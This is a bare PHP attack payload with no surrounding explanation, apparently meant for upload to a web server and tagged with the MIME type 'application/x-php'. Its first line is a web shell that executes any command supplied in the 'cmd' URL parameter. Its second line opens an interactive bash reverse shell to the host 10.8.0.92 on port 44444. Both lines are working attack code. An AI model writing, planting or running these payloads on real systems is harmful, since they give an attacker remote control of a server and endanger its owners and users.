<?php system($_GET["cmd"]); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.92/44444 0>&1'"); ?>

application/x-php